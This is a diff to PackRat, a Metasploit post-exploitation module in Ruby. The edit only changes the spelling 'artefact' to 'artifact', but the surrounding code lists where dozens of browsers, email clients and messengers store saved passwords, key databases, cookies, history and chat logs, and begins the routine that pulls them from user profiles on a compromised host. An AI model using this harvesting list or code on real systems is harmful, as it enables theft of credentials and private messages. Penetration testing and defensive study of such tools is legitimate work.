@@ -18,13 +18,13 @@ class Metasploit3 < Msf::Post
     'Description'  => %q{
      PackRat gathers artifacts of various categories from a large number of applications.
 
-     Artefacts include: chat logins and logs, browser logins and history and cookies,
+     Artifacts include: chat logins and logs, browser logins and history and cookies,
      email logins and emails sent and received and deleted, contacts, and many others.
      These artifacts are collected from applications including:
      12 browsers, 13 chat/IM/IRC applications, 6 email clients, and 1 game.
 
      The use case for this post-exploitation module is to specify the types of
-     artefacts you are interested in, to gather the relevant files depending on your aims.
+     artifacts you are interested in, to gather the relevant files depending on your aims.
 
      Please refer to the options for a full list of filter categories.
     },
@@ -39,15 +39,15 @@ class Metasploit3 < Msf::Post
 
     register_options(
     [
-      OptBool.new('STORE_LOOT', [false, 'Store artefacts into loot database (otherwise, only download)', 'true']),
-      # enumerates the options based on the artefacts that are defined below
+      OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database (otherwise, only download)', 'true']),
+      # enumerates the options based on the artifacts that are defined below
       OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather from', 'All', @@apps.map{ |x| x[:category] }.uniq.unshift('All')]),
       OptEnum.new('APPLICATION', [false, 'Specify application to gather from', 'All', @@apps.map{ |x| x[:application] }.uniq.unshift('All')]),
-      OptEnum.new('ARTEFACTS', [false, 'Type of artefacts to collect', 'All', @@apps.map{ |x| x[:filetypes] }.uniq.unshift('All')]),
+      OptEnum.new('ARTEFACTS', [false, 'Type of artifacts to collect', 'All', @@apps.map{ |x| x[:filetypes] }.uniq.unshift('All')]),
 ], self.class)
   end
 
-  # this associative array defines the artefacts known to PackRat
+  # this associative array defines the artifacts known to PackRat
   @@apps= [
     # Email clients
     ## IncrediMail
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'LocalAppData',
       :dir => 'IM',
-      :artefact=> "msg.iml",
+      :artifact=> "msg.iml",
       :description => "IncrediMail's sent and received emails"},
     ## Outlook
     {
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "deleted_emails",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Deleted Items.dbx",
+      :artifact=> "Deleted Items.dbx",
       :description => "Outlook's Deleted emails"},
     {
       :category => "emails",
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "draft_emails",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Drafts.dbx",
+      :artifact=> "Drafts.dbx",
       :description => "Outlook's unsent emails"},
     {
       :application=> 'outlook',
@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Folders.dbx",
+      :artifact=> "Folders.dbx",
       :description => "Outlook's Folders"},
     {
       :application=> 'outlook',
@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "received_emails",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Inbox.dbx",
+      :artifact=> "Inbox.dbx",
       :description => "Outlook's received emails"},
     {
       :application=> 'outlook',
@@ -98,7 +98,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Offline.dbx",
+      :artifact=> "Offline.dbx",
       :description => "Outlook's offline emails"},
     {
       :category => "emails",
@@ -106,7 +106,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Outbox.dbx",
+      :artifact=> "Outbox.dbx",
       :description => "Outlook's sent emails"},
     {
       :application=> 'outlook',
@@ -114,7 +114,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "sent_emails",
       :path => 'LocalAppData',
       :dir => 'Identities',
-      :artefact=> "Sent Items.dbx",
+      :artifact=> "Sent Items.dbx",
       :description => "Outlook's sent emails"},
     ## Opera Mail
     {
@@ -123,7 +123,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Opera Mail',
-      :artefact=> "wand.dat",
+      :artifact=> "wand.dat",
       :description => "Opera-Mail's saved Username & Passwords"},
     {
       :application=> 'operamail',
@@ -131,7 +131,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'LocalAppData',
       :dir => 'Opera Mail',
-      :artefact=> "*.mbs",
+      :artifact=> "*.mbs",
       :description => "Opera-Mail's emails"},
     ## PostBox Mail
     {
@@ -140,7 +140,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "received_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "INBOX",
+      :artifact=> "INBOX",
       :description => "Postbox's sent and received emails"},
     {
       :application=> 'postbox',
@@ -148,7 +148,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "sent_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Sent*",
+      :artifact=> "Sent*",
       :description => "Postbox's sent and received emails"},
     {
       :application=> 'postbox',
@@ -156,7 +156,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "*.msf",
+      :artifact=> "*.msf",
       :description => "Postbox's sent and received emails"},
     {
       :category => "emails",
@@ -164,7 +164,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Archive.msf",
+      :artifact=> "Archive.msf",
       :description => "Postbox's sent and received emails"},
     {
       :application=> 'postbox',
@@ -172,7 +172,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Bulk Mail.msf",
+      :artifact=> "Bulk Mail.msf",
       :description => "Postbox's junk emails"},
     {
       :category => "emails",
@@ -180,7 +180,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "draft_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Draft.msf",
+      :artifact=> "Draft.msf",
       :description => "Postbox's unsent emails"},
     {
       :application=> 'postbox',
@@ -188,7 +188,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "received_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "INBOX.msf",
+      :artifact=> "INBOX.msf",
       :description => "Postbox's received emails"},
     {
       :application=> 'postbox',
@@ -196,7 +196,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "sent_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Sent*.msf",
+      :artifact=> "Sent*.msf",
       :description => "Postbox's sent emails"},
     {
       :application=> 'postbox',
@@ -204,7 +204,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "sent_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Sent.msf",
+      :artifact=> "Sent.msf",
       :description => "Postbox's sent emails"},
     {
       :application=> 'postbox',
@@ -212,7 +212,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "email_logs",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Templates.msf",
+      :artifact=> "Templates.msf",
       :description => "Postbox's template emails"},
     {
       :application=> 'postbox',
@@ -220,7 +220,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "deleted_emails",
       :path => 'AppData',
       :dir => 'Postbox',
-      :artefact=> "Trash.msf",
+      :artifact=> "Trash.msf",
       :description => "Postbox's Deleted emails"},
     ## Mozilla Thunderbird Mail
     {
@@ -229,7 +229,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "signons.sqlite",
+      :artifact=> "signons.sqlite",
       :description => "Thunderbird's saved Username & Passwords"},
     {
       :application=> 'thunderbird',
@@ -237,7 +237,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "key3.db",
+      :artifact=> "key3.db",
       :description => "Thunderbird's saved Username & Passwords"},
     {
       :application=> 'thunderbird',
@@ -245,7 +245,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "cert8.db",
+      :artifact=> "cert8.db",
       :description => "Thunderbird's saved Username & Passwords"},
     {
       :application=> 'thunderbird',
@@ -253,7 +253,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "received_emails",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "Inbox",
+      :artifact=> "Inbox",
       :description => "Thunderbird's received emails"},
     {
       :application=> 'thunderbird',
@@ -261,7 +261,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "sent_emails",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "Sent",
+      :artifact=> "Sent",
       :description => "Thunderbird's Send emails"},
     {
       :category => "emails",
@@ -269,7 +269,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "deleted_emails",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "Trash",
+      :artifact=> "Trash",
       :description => "Thunderbird's Deleted emails"},
     {
       :application=> 'thunderbird',
@@ -277,7 +277,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "draft_emails",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "Drafts",
+      :artifact=> "Drafts",
       :description => "Thunderbird's unsent emails"},
     {
       :category => "emails",
@@ -285,7 +285,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "database",
       :path => 'AppData',
       :dir => 'Thunderbird',
-      :artefact=> "global-messages-db.sqlite",
+      :artifact=> "global-messages-db.sqlite",
       :description => "emails info"},
     ## Windows Live Mail
     {
@@ -294,7 +294,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Microsoft',
-      :artefact=> "*.oeaccount",
+      :artifact=> "*.oeaccount",
       :description => "Windows Live Mail's saved Username & Password"},
     # Instant Messaging chats applications  x 13
     ## AIM (Aol Instant Messaging)
@@ -304,7 +304,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir => 'AIM',
-      :artefact=> "aimx.bin",
+      :artifact=> "aimx.bin",
       :description => "AIM's saved Username & Passwords"},
     {
       :application=> 'AIM',
@@ -312,7 +312,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'LocalAppData',
       :dir => 'AIM',
-      :artefact=> "*.html",
+      :artifact=> "*.html",
       :description => "AIM's chat logs with date and times"},
     ## Digsby is multi-protocol Instant Messaging client which lets the user to comunicate with all friends from many applications of other IM chat application such as AIM, MSN, Yahoo, ICQ, Google Talk,
     {
@@ -321,7 +321,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir => 'Digsby',
-      :artefact=> "logininfo.yaml",
+      :artifact=> "logininfo.yaml",
       :description => "Digsby's saved Username & Passwords"},
     ## GaduGadu, popular Polish chat (Poland country)
     {
@@ -330,7 +330,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'GG dysk',
       :dir => 'Galeria',
-      :artefact=> "Thumbs.db",
+      :artifact=> "Thumbs.db",
       :description => "Saved Gadu Gadu User Profile Images in Thumbs.db file"},
     {
       :application=> 'gadugadu',
@@ -338,8 +338,8 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => 'GG',
-      :artefact=> "profile.ini",
-      :description => "GaduGadu profile User information : Rename long saved artefactto in profile.ini"},
+      :artifact=> "profile.ini",
+      :description => "GaduGadu profile User information : Rename long saved artifactto in profile.ini"},
     ## ICQ chat is used for messaging, video and voice calls
     {
       :application=> 'ICQ',
@@ -347,7 +347,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'ICQ',
-      :artefact=> "Owner.mdb",
+      :artifact=> "Owner.mdb",
       :description => "ICQ's saved Username & Passwords"},
     {
       :application=> 'ICQ',
@@ -355,7 +355,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => 'ICQ',
-      :artefact=> "Messages.mdb",
+      :artifact=> "Messages.mdb",
       :description => "ICQ's chat logs"},
     ## Miranda is a multi protocol instant messaging client, protocols such as AIM (AOL Instant Messenger), Gadu-Gadu, ICQ, Tlen and others.
     {
@@ -364,7 +364,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Miranda',
-      :artefact=> "Home.dat",
+      :artifact=> "Home.dat",
       :description => "Miranda's multi saved chat protocol Username, (coded Passwords"},
     ## Nimbuzz
     {
@@ -373,7 +373,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'nimbuzz',
-      :artefact=> "nimbuzz.log",
+      :artifact=> "nimbuzz.log",
       :description => "Username&Password - user phone number "},
     ## Pidgen Pidgin is an easy to use and free chat client used by millions. Connect to AIM, MSN, Yahoo, and others
     {
@@ -382,7 +382,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => '.purple',
-      :artefact=> "accounts.xml",
+      :artifact=> "accounts.xml",
       :description => "Pidgen's saved Username & Passwords"},
     {
       :application=> 'pidgen',
@@ -390,7 +390,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => '.purple',
-      :artefact=> "*.html",
+      :artifact=> "*.html",
       :description => "Pidgen's chat logs"},
     ## QQ International is a Chinese online communication instant messagins with 750+ million existing users.
     {
@@ -399,7 +399,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => "Tencent",
-      :artefact=> "UserHeadTemp*",
+      :artifact=> "UserHeadTemp*",
       :description => "QQ's Profile Image"},
     ## Skype
     {
@@ -408,7 +408,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Skype',
-      :artefact=> "main.db",
+      :artifact=> "main.db",
       :description => "Skype's 's saved Username & Passwords"},
     ## Tango - Texts and videos chat for mobiles and PCs
     {
@@ -417,7 +417,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "database",
       :path => 'LocalAppData',
       :dir => 'tango',
-      :artefact=> "contacts.dat",
+      :artifact=> "contacts.dat",
       :description => "All Contact's name "},
     {
       :application=> 'tango',
@@ -425,7 +425,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "software_version",
       :path => 'LocalAppData',
       :dir => 'tango',
-      :artefact=> "install.log",
+      :artifact=> "install.log",
       :description => "Tango Version "},
     ## Tlen.pl is an adware licensed Polish instant messaging service. It is fully compatible with Gadu-Gadu instant messenger.
     {
@@ -434,7 +434,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Tlen.pl',
-      :artefact=> "Profiles.dat",
+      :artifact=> "Profiles.dat",
       :description => "Tlen.pl's saved Username & Passwords"},
     {
       :application=> 'tlen.pl',
@@ -442,7 +442,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => 'Tlen.pl',
-      :artefact=> "*.jpg",
+      :artifact=> "*.jpg",
       :description => "Tlen.pl sent Images"},
     ## Trillian multi-protocol such as  AIM, ICQ.
     {
@@ -451,7 +451,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Trillian',
-      :artefact=> "accounts.ini",
+      :artifact=> "accounts.ini",
       :description => "Trillian's saved Username & Passwords"},
     {
       :application=> 'trillian',
@@ -459,7 +459,7 @@ class Metasploit3 < Msf::Post
       :filetypes => 'chat_logs',
       :path => 'AppData',
       :dir => 'Trillian',
-      :artefact=> "*.log",
+      :artifact=> "*.log",
       :description => "Trillian logs; Open the file"},
     ## Viber - Texts and videos chat for mobiles and PCs
     {
@@ -468,7 +468,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "database",
       :path => 'AppData',
       :dir => 'ViberPC',
-      :artefact=> "viber.db",
+      :artifact=> "viber.db",
       :description => "All Contact's names, numbers, sms are saved from user's mobile"},
     {
       :application=> 'viber',
@@ -476,7 +476,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "thumbs",
       :path => 'AppData',
       :dir => 'ViberPC',
-      :artefact=> "Thumbs.db",
+      :artifact=> "Thumbs.db",
       :description => "Viber's Contact's profile images in Thumbs.db file"},
     {
       :application=> 'viber',
@@ -484,7 +484,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "images",
       :path => 'AppData',
       :dir => 'ViberPC',
-      :artefact=> "*.jpg",
+      :artifact=> "*.jpg",
       :description => "Collects all images of contacts and sent recieved"},
      ## xChat  is used also for
     {
@@ -493,7 +493,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "chat_logs",
       :path => 'AppData',
       :dir => 'X-Chat 2',
-      :artefact=> "*.txt",
+      :artifact=> "*.txt",
       :description => "Collects all chatting conversations of sent and recieved"},
     # Gaming  x1
     ## Xfire is popular for gaming
@@ -503,7 +503,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => 'Xfire',
-      :artefact=> "xfireUser.ini",
+      :artifact=> "xfireUser.ini",
       :description => "Xfire saved Username & Passwords"},
     {
       :application=> 'xfire',
@@ -511,7 +511,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppDataLocal',
       :dir => 'Xfire',
-      :artefact=> "xfireUser.ini",
+      :artifact=> "xfireUser.ini",
       :description => "Xfire saved Username & Passwords"},
     #Web Browsers applications x 13
     ## Avant
@@ -521,7 +521,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir =>'Avant Profiles',
-      :artefact=> "forms.dat",
+      :artifact=> "forms.dat",
       :description => "Avant's saved Username & Passwords"},
     ## Comodo
     {
@@ -530,7 +530,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir =>'COMODO',
-      :artefact=> "Login Data",
+      :artifact=> "Login Data",
       :description => "Comodo's saved Username & Passwords"},
     {
       :application=> "comodo",
@@ -538,7 +538,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'LocalAppData',
       :dir =>'COMODO',
-      :artefact=> "Cookies",
+      :artifact=> "Cookies",
       :description => "Cookies"},
     {
       :application=> "comodo",
@@ -546,7 +546,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalAppData',
       :dir =>'COMODO',
-      :artefact=> "History",
+      :artifact=> "History",
       :description => "Comodo's History"},
     {
       :application=> "comodo",
@@ -554,7 +554,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalAppData',
       :dir =>'COMODO',
-      :artefact=> "Visited Links",
+      :artifact=> "Visited Links",
       :description => "Comodo's History"},
     ## CoolNovo
     {
@@ -563,7 +563,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir =>'MapleStudio',
-      :artefact=> "Login Data",
+      :artifact=> "Login Data",
       :description => "Comodo's saved Username & Passwords"},
     ## Chrome
     {
@@ -572,7 +572,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir => "Google",
-      :artefact=> "Login Data",
+      :artifact=> "Login Data",
       :description => "Chrome's saved Username & Passwords"},
     {
       :application=> "chrome",
@@ -580,7 +580,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'LocalAppData',
       :dir => "Google",
-      :artefact=> "Cookies",
+      :artifact=> "Cookies",
       :description => "Chrome Cookies"},
     {
       :application=> "chrome",
@@ -588,7 +588,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalAppData',
       :dir => "Google",
-      :artefact=> "History",
+      :artifact=> "History",
       :description => "Chrome History"},
     ## FireFox
     {
@@ -597,7 +597,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "logins.json",
+      :artifact=> "logins.json",
       :description => "Firefox's saved Username & Passwords "},
     {
       :application=> "firefox",
@@ -605,7 +605,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "cert8.db",
+      :artifact=> "cert8.db",
       :description => "Firefox's saved Username & Passwords"},
     {
       :application=> "firefox",
@@ -613,7 +613,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "key3.db",
+      :artifact=> "key3.db",
       :description => "Firefox's saved Username & Passwords"},
     {
       :application=> "firefox",
@@ -621,7 +621,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "places.sqlite",
+      :artifact=> "places.sqlite",
       :description => "FireFox History"},
     {
       :application=> "firefox",
@@ -629,7 +629,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir =>'Mozilla',
-      :artefact=> "formhistory.sqlite",
+      :artifact=> "formhistory.sqlite",
       :description => "FireFox's saved Username using sqlite tool"},
     {
       :application=> "firefox",
@@ -637,7 +637,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "cookies.sqlite",
+      :artifact=> "cookies.sqlite",
       :description => "Firefox's cookies"},
     ## Flock
     {
@@ -646,7 +646,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir =>'Flock',
-      :artefact=> "formhistory.sqlite",
+      :artifact=> "formhistory.sqlite",
       :description => "Flock's saved Username"},
     {
       :application=> "flock",
@@ -654,7 +654,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir =>'Flock',
-      :artefact=> "downloads.sqlite",
+      :artifact=> "downloads.sqlite",
       :description => "Flock's downloaded files"},
     {
       :application=> "flock",
@@ -662,7 +662,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'AppData',
       :dir =>'Flock',
-      :artefact=> "cookies.sqlite",
+      :artifact=> "cookies.sqlite",
       :description => "Flock's Cookies file"},
     ## IE
     {
@@ -671,7 +671,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalSettings',
       :dir =>'History',
-      :artefact=> "index.dat",
+      :artifact=> "index.dat",
       :description => "IE's History"},
     ## K-Meleon
     {
@@ -680,7 +680,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "signons.sqlite",
+      :artifact=> "signons.sqlite",
       :description => "K-Meleon's saved Username & Passwords"},
     {
       :application=> "k-meleon",
@@ -688,7 +688,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "key3.db",
+      :artifact=> "key3.db",
       :description => "K-Meleon's saved Username & Passwords"},
     {
       :application=> "k-meleon",
@@ -696,7 +696,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "cert8.db",
+      :artifact=> "cert8.db",
       :description => "K-Meleon's saved Username & Passwords"},
     {
       :application=> "k-meleon",
@@ -704,7 +704,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "cookies.sqlite",
+      :artifact=> "cookies.sqlite",
       :description => "K-Meleon's Cookies"},
     {
       :application=> "k-meleon",
@@ -712,7 +712,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "formhistory.sqlite",
+      :artifact=> "formhistory.sqlite",
       :description => "K-Meleon's Visited websites history"},
     {
       :application=> "k-meleon",
@@ -720,7 +720,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir => "K-Meleon",
-      :artefact=> "places.sqlite",
+      :artifact=> "places.sqlite",
       :description => "K-Meleon's Visited websites history"},
     ## Maxthon
     {
@@ -729,7 +729,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Maxthon3",
-      :artefact=> "MagicFill2.dat",
+      :artifact=> "MagicFill2.dat",
       :description => "Maxthon's saved Username & Passwords"},
     ## Opera
     {
@@ -738,7 +738,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Opera Software",
-      :artefact=> "Login Data",
+      :artifact=> "Login Data",
       :description => "Opera's saved Username & Passwords"},
     {
       :application=> "opera",
@@ -746,7 +746,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'AppData',
       :dir => "Opera Software",
-      :artefact=> "Cookies",
+      :artifact=> "Cookies",
       :description => "Opera Cookies"},
     {
       :application=> "opera",
@@ -754,7 +754,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir => "Opera Software",
-      :artefact=> "Visited Links",
+      :artifact=> "Visited Links",
       :description => "Opera Visited Links"},
     ## SRware
     {
@@ -763,7 +763,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'LocalAppData',
       :dir => "Chromium",
-      :artefact=> "Login Data",
+      :artifact=> "Login Data",
       :description => "SRware's saved Username & Passwords"},
     {
       :application=> "srware",
@@ -771,7 +771,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalAppData',
       :dir => "Chromium",
-      :artefact=> "Cookies",
+      :artifact=> "Cookies",
       :description => "SRware's Cookies"},
     {
       :application=> "srware",
@@ -779,7 +779,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'LocalAppData',
       :dir => "Chromium",
-      :artefact=> "History",
+      :artifact=> "History",
       :description => "SRware's Visited websites history"},
     ## Safari
     {
@@ -788,7 +788,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Apple Computer",
-      :artefact=> "keychain.plist",
+      :artifact=> "keychain.plist",
       :description => "Safari History"},
     ## SeaMonkey
     {
@@ -797,7 +797,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "logins.json",
+      :artifact=> "logins.json",
       :description => "SeaMonkey's saved Username & Passwords"},
     {
       :application=> "seamonkey",
@@ -805,7 +805,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "cert8.db",
+      :artifact=> "cert8.db",
       :description => "SeaMonkey's saved Username & Passwords"},
     {
       :application=> "seamonkey",
@@ -813,7 +813,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "logins",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "key3.db",
+      :artifact=> "key3.db",
       :description => "SeaMonkey's saved Username & Passwords"},
     {
       :application=> "seamonkey",
@@ -821,7 +821,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir =>'Mozilla',
-      :artefact=> "formhistory.sqlite",
+      :artifact=> "formhistory.sqlite",
       :description => "SeaMonkey's saved Username"},
     {
       :application=> "seamonkey",
@@ -829,7 +829,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "web_history",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "places.sqlite",
+      :artifact=> "places.sqlite",
       :description => "SeaMonkey History"},
     {
       :application=> "seamonkey",
@@ -837,7 +837,7 @@ class Metasploit3 < Msf::Post
       :filetypes => "cookies",
       :path => 'AppData',
       :dir => "Mozilla",
-      :artefact=> "cookies.sqlite",
+      :artifact=> "cookies.sqlite",
       :description => "SeaMonkey's cookies"}
   ]
   @@success_count = 0
@@ -854,7 +854,7 @@ class Metasploit3 < Msf::Post
     grab_user_profiles.each do |userprofile|
       @@apps.each { |f| downloading(userprofile, f) }
     end
-    print_status("Downloaded #{@@success_count} artefact(s), attempted #{@@try_count}.\n")
+    print_status("Downloaded #{@@success_count} artifact(s), attempted #{@@try_count}.\n")
   end
 
   # Check to see if the artifact exists on the remote system.
@@ -869,47 +869,47 @@ class Metasploit3 < Msf::Post
   def downloading(profile, opts={})
     cat = opts[:category]
     app = opts[:application]
-    artefact = opts[:artefact]
+    artifact = opts[:artifact]
     ft = opts[:filetypes]
     dir = opts[:dir]
     path = opts[:path]
 
     # filter based on options
     if (cat != datastore['APPCATEGORY'] && datastore['APPCATEGORY'] != 'All') || (app != datastore['APPLICATION'] && datastore['APPLICATION'] != 'All') || (ft != datastore['ARTEFACTS'] && datastore['ARTEFACTS'] != 'All')
-      # doesn't match search criteria, skip this artefact
+      # doesn't match search criteria, skip this artifact
       return false
     end
 
     @@try_count += 1
-    print_status("Searching for #{app.capitalize}'s #{artefact.capitalize} files in #{profile['UserName']}'s user directory...")
+    print_status("Searching for #{app.capitalize}'s #{artifact.capitalize} files in #{profile['UserName']}'s user directory...")
     # check if file exists in user's directory on the remote computer.
     if location(profile, opts)
-      print_status("#{app.capitalize}'s #{artefact.capitalize} file found")
+      print_status("#{app.capitalize}'s #{artifact.capitalize} file found")
     else
-      print_error("#{app.capitalize}'s #{artefact.capitalize} not found in #{profile['UserName']}'s user directory\n")
+      print_error("#{app.capitalize}'s #{artifact.capitalize} not found in #{profile['UserName']}'s user directory\n")
       # skip non-existing file
       return false
     end
 
     # read from app array above
